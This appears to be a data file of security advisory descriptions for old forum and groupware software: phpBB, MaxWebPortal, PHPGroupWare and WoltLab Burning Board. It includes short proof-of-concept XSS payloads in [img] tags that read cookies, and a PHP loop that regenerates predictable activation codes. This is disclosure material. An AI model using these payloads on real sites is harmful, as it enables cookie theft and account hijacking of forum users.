    "Description": "A vulnerability was reported in the phpBB forum software.  A remote user can conduct cross-site scripting attacks against phpBB users to steal their cookies and gain access to their phpBB accounts.\nIt is reported that phpBB allows a remote user to create a message that includes scripting code inserted in the [IMG] tag. For example, a remote user can insert the following text into a message:\n\n[img]http://a.a/a\"onerror=\"javascript:alert(document.cookie)[/img]\n\nWhen the target (victim) user reads the message, the scripting code will be executed by the target user's browser. The code will run in the security context of the site running phpBB. If the code was malicious, it could obtain the target user's cookies associated with that site. This would allow a remote user to grab the target user's authentication cookies and then login to the phpBB forum as the target user.\n\nThis same vulnerability reportedly exists in the remote avatar part of the user profile.\n\nIn December 2004, Gurjanov Ilia reported that in version 1.4.4, scripting code can also be inserted using the 'vbscript' code.  A demonstration exploit is provided:\n\n[img]vbscript: alert(document.cookie)[/img]",

    "Description": "Some input validation vulnerabilities were reported in MaxWebPortal.  A remote user can inject SQL commands and conduct cross-site scripting attacks.\nManuel Lopez reported that the 'SendTo' parameter in Personal Messages is not properly validated.  A remote user can supply a specially crafted value to execute certain SQL queries on the target system's database.  This can be used to obtain information from the database, the report said.\n\nIt is also reported that the software does not filter user-supplied input from the 'sub_name' parameter of 'dl_showall.asp'.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the MaxWebPortal software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. \n\nIt is also reported that the HTTP_REFERER variable of 'down.asp' is not properly filtered and subject to cross-site scripting attacks.\n\nIt is also reported that the 'register' form does not perform input validation when a user specifies an image name for an Avatar file.  A remote user can specify arbitrary HTML or scripting code instead of the Avatar image file.  Then, when a target user views a page that would ordinarily display the remote user's Avatar image, the scripting code will be executed on the target user's browser.",

    "Description": "Security Corporation issued a security advisory warning of an input validation vulnerability in PHPGroupWare.  A remote user can conduct cross-site scripting attacks.\nFrancois Sorin reported that several components do not filter HTML code from user-supplied input.  All of the additional modules that have forms are reportedly affected.\n\nA remote user can insert specially crafted text into a web form field.  Then, when a target user views the information, arbitrary scripting code will be executed by the target user's browser. The code will originate from the site running PHPGroupWare and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.\n\nFor example, a remote user can place scripting code in the name or surname field when adding a contact.\n\nThe following notification timeline is provided:\n\n06/24/2003 Vendor notified\n06/25/2003 Vendor response and solutions\n07/01/2003 Vendor authorisation\n07/01/2003 Security Corporation clients notified\n07/02/2003 Public disclosure",

A remote authenticated user can execute arbitrary code or gain elevated privileges on the system.\nCarl Livitt reported that the system generates predictable numbers for use as authentication tokens.  The report indicates that a seed for the 'internal program secret' value is based on the relatively predictable process ID of the setup process.  As a result, a user can determine a small number of possible values for the internal program secret value.  With these values, a remote authenticated user can gain elevated privileges on the system.  With these privileges, the user can add Sysops, modify the bulletin board system, and perform other functions.\n\nIt is also reported that the software does not perform bounds checking on several variables, allowing a remote authenticated user to trigger a buffer overflow and overwrite the EIP register with an arbitrary value.  This allows the remote authenticated user to execute arbitrary code on the system.  A demonstration exploit is provided [in the Source Message].\n\nIt is also reported that a remote authenticated user can write a large amount of data to their biography file to consume all available disk space on the partition.  This can result in denial of service conditions on the system.\n\nThe following vendor notification timeline is provided:\n\n14 July 2003: Contacted author by email.

The report states that a remote user can edit the description of a media file attached to an approved or pending article, which is then displayed via the HTML 'alt' attribute.

A remote user may be able to hijack a newly registered user account.\nIt is reported that WoltLab Burning Board (wBB) uses predictable or guessable temporary passwords when it creates a new user account. If another user has requested a new account but has not yet activated the registration, the user's account may be hijacked.\n\nTo determine how many users exist on the forum, a remote user can register for a new account.  The remote user will receive a confirmation e-mail that contains the following type of URL to activate the account:\n\nhttp://forum.dom/forum/action.php?action=activation&userid=345&code=1563109322\n\nIn the above example, it is shown that any subsequent user will be assigned userid of 346 or higher.  So, a remote user can attempt to guess the 'code' for any subsequent user.  According to the report, the wBB software uses the date to seed a function that will generate only a limited number of codes (possibly 30 integer words).  So, a remote user can feasibly conduct a brute force guessing attack to guess the proper code for a newly assigned user account.\n\nA demonstration exploit that will apparently generate all of the possible codes is provided:\n\n<?php\nfor($i=0; $i<60; $i++)\n{\nmt_srand($i);\necho mt_rand().\"<BR>\";\n}\n?>",
